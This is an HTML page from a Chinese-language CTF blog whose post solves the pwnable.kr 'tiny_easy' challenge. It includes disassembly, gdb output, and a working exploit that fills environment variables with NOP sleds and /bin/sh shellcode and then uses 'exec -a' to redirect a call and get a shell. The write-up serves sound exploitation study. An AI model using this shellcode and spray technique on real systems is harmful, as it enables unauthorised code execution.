@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言考验漏洞利用能力的题目，长姿势了。参考了别人的writeup 分析没有源代码，就丢ida逆向了1234567891011121314LOAD:08048054 ; Attributes: noreturnLOAD:08048054LOAD:08048054                 public startLOAD:08048054 start           proc nearLO">
+<meta name="keywords" content="pwnable.kr,PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr-tiny_easy">
+<meta property="og:url" content="http://yoursite.com/2018/02/26/pwnable.kr-tiny_easy/index.html">
+<meta property="og:site_name" content="R00tnb&#39;s Blog">
+<meta property="og:description" content="前言考验漏洞利用能力的题目，长姿势了。参考了别人的writeup 分析没有源代码，就丢ida逆向了1234567891011121314LOAD:08048054 ; Attributes: noreturnLOAD:08048054LOAD:08048054                 public startLOAD:08048054 start           proc nearLO">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-08-04T07:10:57.837Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.kr-tiny_easy">
+<meta name="twitter:description" content="前言考验漏洞利用能力的题目，长姿势了。参考了别人的writeup 分析没有源代码，就丢ida逆向了1234567891011121314LOAD:08048054 ; Attributes: noreturnLOAD:08048054LOAD:08048054                 public startLOAD:08048054 start           proc nearLO">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/02/26/pwnable.kr-tiny_easy/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>pwnable.kr-tiny_easy | R00tnb's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R00tnb's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/26/pwnable.kr-tiny_easy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="r00tnb">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R00tnb's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">pwnable.kr-tiny_easy
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2018-02-26 21:00:19" itemprop="dateCreated datePublished" datetime="2018-02-26T21:00:19+08:00">2018-02-26</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Updated at: 2018-08-04 15:10:57" itemprop="dateModified" datetime="2018-08-04T15:10:57+08:00">2018-08-04</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>考验漏洞利用能力的题目，长姿势了。参考了别人的<a href="https://blog.yiz96.com/pwnable-kr-tiny_easy/" target="_blank" rel="noopener">writeup</a></p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>没有源代码，就丢ida逆向了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048054 ; Attributes: noreturn</span><br><span class="line">LOAD:08048054</span><br><span class="line">LOAD:08048054                 public start</span><br><span class="line">LOAD:08048054 start           proc near</span><br><span class="line">LOAD:08048054                 pop     eax</span><br><span class="line">LOAD:08048055                 pop     edx</span><br><span class="line">LOAD:08048056                 mov     edx, [edx]</span><br><span class="line">LOAD:08048058                 call    edx</span><br><span class="line">LOAD:08048058 start           endp ; sp-analysis failed</span><br><span class="line">LOAD:08048058</span><br><span class="line">LOAD:08048058 LOAD            ends</span><br><span class="line">LOAD:08048058</span><br><span class="line">LOAD:08048058</span><br><span class="line">LOAD:08048058                 end start</span><br></pre></td></tr></table></figure></p>
+<p>这是什么程序？？就这一点代码就什么都没了？当时也很蒙蔽，不过漏洞还是很容易看出来的。<code>call</code>调用其实是可以通过栈内数据控制的，但是栈上的数据是什么呢？丢进<code>gdb</code>看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   0x8048050:	add    BYTE PTR [eax],dl</span><br><span class="line">   0x8048052:	add    BYTE PTR [eax],al</span><br><span class="line">=&gt; 0x8048054:	pop    eax</span><br><span class="line">   0x8048055:	pop    edx</span><br><span class="line">   0x8048056:	mov    edx,DWORD PTR [edx]</span><br><span class="line">   0x8048058:	call   edx</span><br><span class="line">   0x804805a:	add    BYTE PTR [eax],al</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffcf23c0 --&gt; 0x1 </span><br><span class="line">0004| 0xffcf23c4 --&gt; 0xffcf32bb (&quot;/root/桌面/test/tiny_easy&quot;)</span><br><span class="line">0008| 0xffcf23c8 --&gt; 0x0 </span><br><span class="line">0012| 0xffcf23cc --&gt; 0xffcf32db (&quot;XDG_VTNR=7&quot;)</span><br><span class="line">0016| 0xffcf23d0 --&gt; 0xffcf32e6 (&quot;XDG_SESSION_ID=c2&quot;)</span><br><span class="line">0020| 0xffcf23d4 --&gt; 0xffcf32f8 (&quot;XDG_GREETER_DATA_DIR=/var/lib/lightdm-data/gyh&quot;)</span><br><span class="line">0024| 0xffcf23d8 --&gt; 0xffcf3327 (&quot;CLUTTER_IM_MODULE=xim&quot;)</span><br><span class="line">0028| 0xffcf23dc --&gt; 0xffcf333d (&quot;GPG_AGENT_INFO=/home/gyh/.gnupg/S.gpg-agent:0:1&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048054 in ?? ()</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure></p>
+<p>原来栈上的数据就是传入参数和环境变量的地址，接下来执行到<code>call edx</code>看看程序会转向哪儿。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x1 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x0 </span><br><span class="line">EDX: 0x6d6f682f (&apos;/hom&apos;)</span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0x0 </span><br><span class="line">ESP: 0xffcf23c8 --&gt; 0x0 </span><br><span class="line">EIP: 0x8048058 (call   edx)</span><br><span class="line">EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048051:	adc    BYTE PTR [eax],al</span><br><span class="line">   0x8048053:	add    BYTE PTR [eax+0x5a],bl</span><br><span class="line">   0x8048056:	mov    edx,DWORD PTR [edx]</span><br><span class="line">=&gt; 0x8048058:	call   edx</span><br><span class="line">   0x804805a:	add    BYTE PTR [eax],al</span><br><span class="line">   0x804805c:	add    BYTE PTR [eax],al</span><br><span class="line">   0x804805e:	add    BYTE PTR [eax],al</span><br><span class="line">   0x8048060:	add    BYTE PTR [eax],al</span><br></pre></td></tr></table></figure></p>
+<p>可以看到<code>edx</code>的值就是第一个传入参数的前4个字节，这里是<code>/hom</code>。如果控制了这4个字节，就控制了程序的流程。<br>但是程序空间中没有调用任何函数代码，所以要getshell只有写入<code>shellcode</code>并跳转执行才可，程序能控制写入的地方只有环境变量和传入参数了，于是可以将shellcode写到这里面。但是题目平台是开启<code>ASLR</code>的，不能确定环境变量和传入参数的地址。这里可以控制程序跳转到一个大致的地址去，然后在环境变量里安排<code>[NOP][shelcode]</code>类似的shellcode，其中<code>nop</code>指令相对于<code>shellcode</code>要非常多，这样当程序执行跳转时一旦跳到<code>nop</code>覆盖的区域就会被引导至<code>shellcode</code>。<br>这个大致的地址可以选取调试时见到的值如<code>0xffcf333d</code>，<code>shellcode</code>可以用pwntools的shellcraft模块生成，于是exp如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入环境变量</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 500`; <span class="keyword">do</span> <span class="built_in">export</span> A_<span class="variable">$i</span>=$(python -c <span class="string">'print "\x90"*4096+"jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"'</span>);<span class="keyword">done</span>;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy &amp;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">tiny_easy@ubuntu:~$ <span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 500`; <span class="keyword">do</span> <span class="built_in">export</span> A_<span class="variable">$i</span>=$(python -c <span class="string">'print "\x90"*4096+"jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"'</span>);<span class="keyword">done</span>;</span><br><span class="line">tiny_easy@ubuntu:~$ <span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy &amp;</span><br><span class="line">[1] 30389</span><br><span class="line">tiny_easy@ubuntu:~$ <span class="built_in">fg</span></span><br><span class="line">-bash: <span class="built_in">fg</span>: job has terminated</span><br><span class="line">[1]+  Segmentation fault      <span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy</span><br><span class="line">tiny_easy@ubuntu:~$ <span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy &amp;</span><br><span class="line">[1] 5710</span><br><span class="line">tiny_easy@ubuntu:~$ <span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy &amp;</span><br><span class="line">[2] 11068</span><br><span class="line">[1]   Segmentation fault      <span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy</span><br><span class="line">tiny_easy@ubuntu:~$ <span class="built_in">fg</span></span><br><span class="line"><span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy</span><br><span class="line">$ ls</span><br><span class="line">flag  tiny_easy</span><br><span class="line">$ cat flag</span><br><span class="line">What a tiny task :) good job!</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+<p>另外，我所参考的writeup实际上还使用了<code>ulimit -s unlimited</code>关闭aslr的方法，但这个漏洞已经在题目平台修补了，可以参考<code>CVE-2016-3672</code>漏洞描述或者<a href="http://www.freebuf.com/vuls/101169.html" target="_blank" rel="noopener">这篇文章</a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>该题漏洞的利用方法类似<code>heap spray</code>，只不过这是把<code>shellcode</code>布置在环境变量的节区上，该方法以前知道但是到了正真使用的时候却忘了，看来还是要多多练习呀。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwnable-kr/" rel="tag"># pwnable.kr</a>
+          
+            <a href="/tags/PWN/" rel="tag"># PWN</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/26/pwnable.kr-otp/" rel="next" title="pwnable.kr-otp">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-otp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/02/27/pwnable.kr-fsb/" rel="prev" title="pwnable.kr-fsb">
+                pwnable.kr-fsb <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">r00tnb</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">44</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">r00tnb</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
